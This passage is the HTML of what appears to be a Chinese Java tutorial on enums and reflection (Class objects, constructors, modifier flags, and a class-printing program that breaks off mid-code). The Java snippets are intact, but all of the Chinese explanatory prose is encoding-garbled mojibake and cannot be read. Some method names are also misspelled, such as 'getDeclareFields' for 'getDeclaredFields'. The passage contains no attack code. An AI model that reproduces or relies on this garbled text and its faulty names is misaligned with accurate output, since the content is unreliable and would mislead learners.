<span class="token keyword">enum</span> <span class="token class-name">Size</span> <span class="token punctuation">&#123;</span><span class="token constant">SMALL</span><span class="token punctuation">,</span><span class="token constant">MEDIUM</span><span class="token punctuation">,</span><span class="token constant">LARGE</span><span class="token punctuation">,</span><span class="token constant">EXTRA_LARGE</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><p>ÂÆûÈôÖ‰∏äÔºåËøô‰∏™Â£∞ÊòéÂÆö‰πâÁöÑÁ±ªÂûãÊòØ‰∏Ä‰∏™Á±ªÔºåÂÆÉÂàöÂ•ΩÊúâÂõõ‰∏™ÂÆû‰æãÔºå‰∏çÂèØËÉΩÊûÑÈÄ†Êñ∞ÁöÑÂØπË±°„ÄÇ</p><p>Âõ†Ê≠§ÔºåÂú®ÊØîËæÉ‰∏§‰∏™Êûö‰∏æÁ±ªÂûãÁöÑÂÄºÊó∂ÔºåÂπ∂‰∏çÈúÄË¶ÅË∞ÉÁî®<code>equals</code>ÔºåÁõ¥Êé•‰ΩøÁî®<code>==</code>Â∞±ÂèØ‰ª•‰∫Ü„ÄÇ</p><p>ÂêåÊ†∑ÂèØ‰ª•‰∏∫Êûö‰∏æÁ±ªÂûãÂ¢ûÂä†ÊûÑÈÄ†Âô®„ÄÅÊñπÊ≥ïÂíåÂ≠óÊÆµ„ÄÇ</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">enum</span> <span class="token class-name">Size</span><span class="token punctuation">&#123;</span>    <span class="token function">SMALL</span><span class="token punctuation">(</span><span class="token string">"S"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">MEDIUM</span><span class="token punctuation">(</span><span class="token string">"M"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">LARGE</span><span class="token punctuation">(</span><span class="token string">"L"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token function">EXTRA_LARGE</span><span class="token punctuation">(</span><span class="token string">"XL"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">String</span> abbreviation<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token class-name">Size</span><span class="token punctuation">(</span><span class="token class-name">String</span> abbreviation<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>abbreviation <span class="token operator">=</span> abbreviation<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getAbbreviation</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>abbreviation<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>Êûö‰∏æÁöÑÊûÑÈÄ†Âô®ÊÄªÊòØÁßÅÊúâÁöÑ„ÄÇ</p><p>ÊâÄÊúâÁöÑÊûö‰∏æÁ±ªÂûãÈÉΩÊòØ<code>Enum</code>Á±ªÁöÑÂ≠êÁ±ª„ÄÇ</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Size</span><span class="token punctuation">.</span><span class="token constant">SMALL</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//com.javalearn.Size</span></code></pre><p>ÂÆÉ‰ª¨ÁªßÊâø‰∫ÜËøô‰∏™Á±ªÁöÑËÆ∏Â§öÊñπÊ≥ïÔºåÂÖ∂‰∏≠ÊúÄÊúâÁî®ÁöÑ‰∏Ä‰∏™ÊòØ<code>toString</code>ÔºåËøô‰∏™ÊñπÊ≥ïËøîÂõûÊûö‰∏æÂ∏∏ÈáèÂêçÔºö</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Size</span><span class="token punctuation">.</span><span class="token constant">SMALL</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//SMALL</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Size</span><span class="token punctuation">.</span><span class="token constant">SMALL</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//java.lang.String</span></code></pre><p><code>toString</code>ÁöÑÈÄÜÊñπÊ≥ïÊòØÈùôÊÄÅ<code>valueOf</code>Ôºö</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Enum</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span><span class="token class-name">Size</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token string">"SMALL"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//SMALL</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Enum</span><span class="token punctuation">.</span><span class="token function">valueOf</span><span class="token punctuation">(</span><span class="token class-name">Size</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token string">"SMALL"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//com.javalearn.Size</span></code></pre><p>ÊØè‰∏™Êûö‰∏æÁ±ªÂûãÈÉΩÊúâ‰∏Ä‰∏™ÈùôÊÄÅÁöÑ<code>values</code>ÊñπÊ≥ïÔºåÂÆÉÂ∞ÜËøîÂõû‰∏Ä‰∏™ÂåÖÂê´ÂÖ®ÈÉ®Êûö‰∏æÂÄºÁöÑÊï∞ÁªÑ„ÄÇ</p><pre class="language-java" data-language="java"><code class="language-java">        <span class="token class-name">Size</span><span class="token punctuation">[</span><span class="token punctuation">]</span> values <span class="token operator">=</span> <span class="token class-name">Size</span><span class="token punctuation">.</span><span class="token function">values</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token class-name">Size</span> e<span class="token operator">:</span>values<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token comment">/*SMALLMEDIUMLARGEEXTRA_LARGE*/</span></code></pre><p><code>ordinal</code>ÊñπÊ≥ïËøîÂõûenumÂ£∞Êòé‰∏≠Êûö‰∏æÂ∏∏ÈáèÁöÑ‰ΩçÁΩÆÔºå‰ΩçÁΩÆ‰ªé0ÂºÄÂßãËÆ°Êï∞„ÄÇ</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">Size</span><span class="token punctuation">.</span><span class="token constant">SMALL</span><span class="token punctuation">.</span><span class="token function">ordinal</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//0</span></code></pre><h3 id="ÂèçÂ∞Ñ"><a href="#ÂèçÂ∞Ñ" class="headerlink" title="ÂèçÂ∞Ñ"></a>ÂèçÂ∞Ñ</h3><p><strong>Ôºà‰πãÂêé‰ºöÂÜç‰∏ìÈó®ÈíàÂØπJavaÂÆâÂÖ®‰∏≠ÂèçÂ∞ÑÁöÑÂà©Áî®ËøõË°å‰∏Ä‰∏ãÂ≠¶‰π†Ôºâ</strong></p><p>ÂèçÂ∞ÑÂ∫ìÊèê‰æõ‰∫Ü‰∏Ä‰∏™‰∏∞ÂØå‰∏îÁ≤æÂ∑ßÁöÑÂ∑•ÂÖ∑ÈõÜÔºåÂèØ‰ª•Áî®Êù•ÁºñÂÜôËÉΩÂ§üÂä®ÊÄÅÊìçÁ∫µJava‰ª£Á†ÅÁöÑÁ®ãÂ∫è„ÄÇ</p><p>ËÉΩÂ§üÂàÜÊûêÁ±ªËÉΩÂäõÁöÑÁ®ãÂ∫èÁß∞‰∏∫<strong>ÂèçÂ∞Ñ</strong>„ÄÇ</p><p>ÂèçÂ∞ÑÊú∫Âà∂ÂèØ‰ª•Áî®Êù•Ôºö</p><ul><li>Âú®ËøêË°åÊó∂ÂàÜÊûêÁ±ªÁöÑËÉΩÂäõ„ÄÇ</li><li>Âú®ËøêË°åÊó∂Ê£ÄÊü•ÂØπË±°„ÄÇ</li><li>ÂÆûÁé∞Ê≥õÂûãÊï∞ÁªÑÊìç‰Ωú‰ª£Á†Å„ÄÇ</li><li>Âà©Áî®MethodÂØπË±°ÔºåËøô‰∏™ÂØπË±°ÂæàÂÉèC++‰∏≠ÁöÑÂáΩÊï∞ÊåáÈíà„ÄÇ</li></ul><h4 id="ClassÁ±ª"><a href="#ClassÁ±ª" class="headerlink" title="ClassÁ±ª"></a>ClassÁ±ª</h4><p>Âú®Á®ãÂ∫èËøêË°åÊúüÈó¥ÔºåJavaËøêË°åÊó∂Á≥ªÁªüÂßãÁªà‰∏∫ÊâÄÊúâÂØπË±°Áª¥Êä§‰∏Ä‰∏™ËøêË°åÊó∂Á±ªÂûãÊ†áËØÜ„ÄÇËøô‰∏™‰ø°ÊÅØ‰ºöË∑üË∏™ÊØè‰∏™ÂØπË±°ÊâÄÂ±ûÁöÑÁ±ª„ÄÇËôöÊãüÊú∫Âà©Áî®ËøêË°åÊó∂Á±ªÂûã‰ø°ÊÅØÈÄâÊã©Ë¶ÅÊâßË°åÁöÑÊ≠£Á°ÆÊñπÊ≥ï„ÄÇ</p><p>ÂèØ‰ª•‰ΩøÁî®‰∏Ä‰∏™ÁâπÊÆäÁöÑJavaÁ±ªËÆøÈóÆËøô‰∫õ‰ø°ÊÅØ„ÄÇ‰øùÂ≠òËøô‰∫õ‰ø°ÊÅØÁöÑÁ±ªÂêç‰∏∫<code>Class</code>„ÄÇ</p><p><code>Object</code>Á±ª‰∏≠ÁöÑ<code>getClass()</code>ÊñπÊ≥ïÂ∞Ü‰ºöËøîÂõû‰∏Ä‰∏™<code>Class</code>Á±ªÂûãÁöÑÂÆû‰æã„ÄÇ</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">var</span> e <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token string">"feng"</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Class</span> cl <span class="token operator">=</span> e<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>cl<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//class com.javalearn.Employee</span></code></pre><p><code>Class</code>ÂØπË±°‰ºöÊèèËø∞‰∏Ä‰∏™ÁâπÂÆöÁ±ªÁöÑÂ±ûÊÄß„ÄÇÊúÄÂ∏∏Áî®ÁöÑClassÊñπÊ≥ïÂ∞±ÊòØ<code>getName</code>„ÄÇËøô‰∏™ÊñπÊ≥ïÂ∞ÜËøîÂõûÁ±ªÁöÑÂêçÂ≠ó„ÄÇ</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">var</span> e <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token string">"feng"</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Class</span> cl <span class="token operator">=</span> e<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>cl<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>Â¶ÇÊûúÁ±ªÂú®‰∏Ä‰∏™ÂåÖÈáåÔºåÂåÖÁöÑÂêçÂ≠ó‰πü‰Ωú‰∏∫Á±ªÂêçÁöÑ‰∏ÄÈÉ®ÂàÜ„ÄÇÊâÄ‰ª•ÊàëËøôÈáå‰ºöËøîÂõû<code>com.javalearn.Employee</code></p><p>ËøòÂèØ‰ª•‰ΩøÁî®ÈùôÊÄÅÊñπÊ≥ï<code>forName</code>Ëé∑ÂæóÁ±ªÂêçÂØπÂ∫îÁöÑ<code>Class</code>ÂØπË±°„ÄÇ</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> className <span class="token operator">=</span> <span class="token string">"com.javalearn.Employee"</span><span class="token punctuation">;</span><span class="token class-name">Class</span> cl <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>Ëé∑Âæó<code>Class</code>Á±ªÂØπË±°ÁöÑÁ¨¨‰∏âÁßçÊñπÊ≥ïÊòØ‰∏Ä‰∏™ÂæàÊñπ‰æøÁöÑÂø´Êç∑ÊñπÂºè„ÄÇÂ¶ÇÊûúTÊòØ‰ªªÊÑèÁöÑJavaÁ±ªÂûãÔºàÊàñvoidÂÖ≥ÈîÆÂ≠óÔºâÔºå<code>T.class</code>Â∞Ü‰ª£Ë°®ÂåπÈÖçÁöÑÁ±ªÂØπË±°„ÄÇ</p><blockquote><p><code>Class</code>Á±ªÂÆûÈôÖ‰∏äÊòØ‰∏Ä‰∏™Ê≥õÂûãÁ±ª„ÄÇ</p></blockquote><p>ËôöÊãüÊú∫‰∏∫ÊØè‰∏™Á±ªÂûãÁÆ°ÁêÜ‰∏Ä‰∏™ÂîØ‰∏ÄÁöÑ<code>Class</code>ÂØπË±°„ÄÇÂõ†Ê≠§ÔºåÂèØ‰ª•Âà©Áî®<code>==</code>ËøêÁÆóÁ¨¶ÂÆûÁé∞‰∏§‰∏™Á±ªÂØπË±°ÁöÑÊØîËæÉ„ÄÇ</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">var</span> e <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Employee</span><span class="token punctuation">(</span><span class="token string">"feng"</span><span class="token punctuation">,</span><span class="token number">123</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token class-name">Employee</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"ok"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>Â¶ÇÊûúÊúâ‰∏Ä‰∏™<code>Class</code>Á±ªÂûãÁöÑÂØπË±°ÔºåÂèØ‰ª•Áî®ÂÆÉÊûÑÈÄ†Á±ªÁöÑÂÆû‰æã„ÄÇË∞ÉÁî®<code>getConstructor</code>ÊñπÊ≥ïÂ∞ÜÂæóÂà∞‰∏Ä‰∏™<code>Constructor</code>Á±ªÂûãÁöÑÂØπË±°ÔºåÁÑ∂Âêé‰ΩøÁî®<code>newInstance</code>ÊñπÊ≥ïÊù•ÊûÑÈÄ†‰∏Ä‰∏™ÂÆû‰æã„ÄÇ</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> className <span class="token operator">=</span> <span class="token string">"com.javalearn.Employee"</span><span class="token punctuation">;</span><span class="token class-name">Class</span> cl <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Object</span> obj <span class="token operator">=</span> cl<span class="token punctuation">.</span><span class="token function">getConstructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">newInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>‰ΩÜÊòØËøô‰∏™Á±ªÂ¶ÇÊûúÊ≤°ÊúâÊó†ÂèÇÊï∞ÁöÑÊûÑÈÄ†Âô®Ôºå<code>getConstructor</code>ÊñπÊ≥ï‰ºöÊäõÂá∫ÂºÇÂ∏∏„ÄÇ</p><h4 id="Â£∞ÊòéÂºÇÂ∏∏ÂÖ•Èó®"><a href="#Â£∞ÊòéÂºÇÂ∏∏ÂÖ•Èó®" class="headerlink" title="Â£∞ÊòéÂºÇÂ∏∏ÂÖ•Èó®"></a>Â£∞ÊòéÂºÇÂ∏∏ÂÖ•Èó®</h4><p>ÂΩìËøêË°åÊó∂ÂèëÁîüÈîôËØØÊó∂ÔºåÁ®ãÂ∫èÂ∞±‰ºö‚ÄúÊäõÂá∫‰∏Ä‰∏™ÂºÇÂ∏∏‚Äù„ÄÇÊàë‰ª¨ÂèØ‰ª•Êèê‰æõ‰∏Ä‰∏™Â§ÑÁêÜÂô®‚ÄúÊçïËé∑‚ÄùËøô‰∏™ÂºÇÂ∏∏Âπ∂ËøõË°åÂ§ÑÁêÜ„ÄÇ</p><p>ÂºÇÂ∏∏Êúâ‰∏§ÁßçÁ±ªÂûãÔºåÈùûÊ£ÄÊü•ÂûãÂºÇÂ∏∏ÂíåÊ£ÄÊü•ÂûãÂºÇÂ∏∏„ÄÇ</p><p>Â¶ÇÊûú‰∏Ä‰∏™ÊñπÊ≥ïÂåÖÂê´‰∏ÄÊù°ÂèØËÉΩÊäõÂá∫Ê£ÄÊü•ÂûãÂºÇÂ∏∏ÁöÑËØ≠Âè•ÔºåÂàôÂú®ÊñπÊ≥ïÂêç‰∏äÂ¢ûÂä†‰∏Ä‰∏™<code>throws</code>Â≠êÂè•Ôºö</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ReflectiveOperationException</span> <span class="token punctuation">&#123;</span></code></pre><p>Ë∞ÉÁî®Ëøô‰∏™ÊñπÊ≥ïÁöÑ‰ªª‰ΩïÊñπÊ≥ï‰πüÈÉΩÈúÄË¶Å‰∏Ä‰∏™<code>throws</code>Â£∞Êòé„ÄÇ</p><h4 id="Âà©Áî®ÂèçÂ∞ÑÂàÜÊûêÁ±ªÁöÑËÉΩÂäõ"><a href="#Âà©Áî®ÂèçÂ∞ÑÂàÜÊûêÁ±ªÁöÑËÉΩÂäõ" class="headerlink" title="Âà©Áî®ÂèçÂ∞ÑÂàÜÊûêÁ±ªÁöÑËÉΩÂäõ"></a>Âà©Áî®ÂèçÂ∞ÑÂàÜÊûêÁ±ªÁöÑËÉΩÂäõ</h4><p>Âú®<code>java.lang.reflect</code>ÂåÖ‰∏≠Êúâ‰∏â‰∏™Á±ª<code>Field„ÄÅMethodÂíåConstructor</code>ÂàÜÂà´Áî®‰∫éÊèèËø∞Á±ªÁöÑÂ≠óÊÆµ„ÄÅÊñπÊ≥ïÂíåÊûÑÈÄ†Âô®„ÄÇËøô‰∏â‰∏™Á±ªÈÉΩÊúâ‰∏Ä‰∏™Âè´ÂÅö<code>getName</code>ÁöÑÊñπÊ≥ïÔºåÁî®Êù•ËøîÂõûÂ≠óÊÆµ„ÄÅÊñπÊ≥ïÊàñÊûÑÈÄ†Âô®ÁöÑÂêçÁß∞„ÄÇ</p><p><code>Field</code>Á±ª‰∏≠Êúâ<code>getType</code>ÊñπÊ≥ïÁî®Êù•ËøîÂõûÊèèËø∞Â≠óÊÆµÁ±ªÂûãÁöÑ‰∏Ä‰∏™ÂØπË±°„ÄÇ<code>Method</code>Âíå<code>Constructor</code>‰πüÊúâÊä•ÂëäÂèÇÊï∞Á±ªÂûãÁöÑÊñπÊ≥ïÔºö<code>getParameterTypes</code>„ÄÇ<code>Method</code>Á±ªËøòÊúâ‰∏Ä‰∏™Êä•ÂëäËøîÂõûÁ±ªÂûãÁöÑÊñπÊ≥ï<code>getReturnType</code>„ÄÇ</p><p>Ëøô‰∏â‰∏™Á±ªÈÉΩÊúâ‰∏Ä‰∏™Âêç‰∏∫<code>getModifiers</code>ÁöÑÊñπÊ≥ïÔºåÂÆÉÂ∞ÜËøîÂõû‰∏Ä‰∏™Êï¥Êï∞ÔºåÁî®‰∏çÂêåÁöÑ0&#x2F;1‰ΩçÊèèËø∞ÊâÄ‰ΩøÁî®ÁöÑ‰øÆÈ•∞Á¨¶ÔºåÂ¶ÇpublicÂíåstatic„ÄÇËøòÂèØ‰ª•Âà©Áî®<code>Modifier.toString</code>ÊñπÊ≥ïÂ∞Ü‰øÆÈ•∞Á¨¶ÊâìÂç∞Âá∫Êù•„ÄÇ</p><table><thead><tr><th>‰øÆÈ•∞Á¨¶</th><th>ÂØπÂ∫îÁöÑintÁ±ªÂûã</th></tr></thead><tbody><tr><td>public</td><td>1</td></tr><tr><td>private</td><td>2</td></tr><tr><td>protected</td><td>4</td></tr><tr><td>static</td><td>8</td></tr><tr><td>final</td><td>16</td></tr><tr><td>synchronized</td><td>32</td></tr><tr><td>volatile</td><td>64</td></tr><tr><td>transient</td><td>128</td></tr><tr><td>native</td><td>256</td></tr><tr><td>interface</td><td>512</td></tr><tr><td>abstract</td><td>1024</td></tr><tr><td>strict</td><td>2048</td></tr></tbody></table><p><code>Class</code>Á±ª‰∏≠ÁöÑ<code>getFields</code>„ÄÅ<code>getMethods</code>Âíå<code>getConstructors</code>ÊñπÊ≥ïÂ∞ÜÂàÜÂà´ËøîÂõûËøô‰∏™Á±ªÊîØÊåÅÁöÑ<strong>ÂÖ¨ÂÖ±</strong>Â≠óÊÆµ„ÄÅÊñπÊ≥ïÂíåÊûÑÈÄ†Âô®ÁöÑÊï∞ÁªÑÔºåÂÖ∂‰∏≠ÂåÖÊã¨Ë∂ÖÁ±ªÁöÑ<strong>ÂÖ¨ÂÖ±</strong>ÊàêÂëò„ÄÇ</p><p><code>Class</code>Á±ªÁöÑ<code>getDeclareFields</code>„ÄÅ<code>getDeclareMethods</code>Âíå<code>getDeclaredConstructors</code>ÊñπÊ≥ïÂ∞ÜÂàÜÂà´ËøîÂõûÁ±ª‰∏≠Â£∞ÊòéÁöÑÂÖ®ÈÉ®Â≠óÊÆµ„ÄÅÊñπÊ≥ïÂíåÊûÑÈÄ†Âô®ÁöÑÊï∞ÁªÑÔºåÂÖ∂‰∏≠ÂåÖÊã¨ÁßÅÊúâÊàêÂëò„ÄÅÂåÖÊàêÂëòÂíåÂèó‰øùÊä§ÊàêÂëòÔºå<strong>‰ΩÜ‰∏çÂåÖÊã¨Ë∂ÖÁ±ªÁöÑÊàêÂëò</strong> „ÄÇ</p><p>‰∏ãÈù¢Ëøô‰∏™Á®ãÂ∫èÊòæÁ§∫Â¶Ç‰ΩïÊâìÂç∞‰∏Ä‰∏™Á±ªÁöÑÂÖ®ÈÉ®‰ø°ÊÅØÔºö</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>javalearn</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Constructor</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Method</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Modifier</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ReflectionTest</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">ReflectiveOperationException</span>    <span class="token punctuation">&#123;</span>        <span class="token class-name">String</span> className <span class="token operator">=</span> <span class="token string">"com.javalearn.Employee"</span><span class="token punctuation">;</span>        <span class="token class-name">Class</span> cl <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span>className<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Class</span> supercl <span class="token operator">=</span> cl<span class="token punctuation">.</span><span class="token function">getSuperclass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> modifiers <span class="token operator">=</span> <span class="token class-name">Modifier</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>cl<span class="token punctuation">.</span><span class="token function">getModifiers</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>modifiers<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span>modifiers<span class="token operator">+</span><span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"class "</span> <span class="token operator">+</span> className<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>supercl <span class="token operator">!=</span><span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> supercl <span class="token operator">!=</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span> <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">" extends "</span> <span class="token operator">+</span> supercl<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"\n&#123;\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printConstructors</span><span class="token punctuation">(</span>cl<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printMethods</span><span class="token punctuation">(</span>cl<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printFields</span><span class="token punctuation">(</span>cl<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">print</span><span class="token punctuation">(</span><span class="token string">"&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token 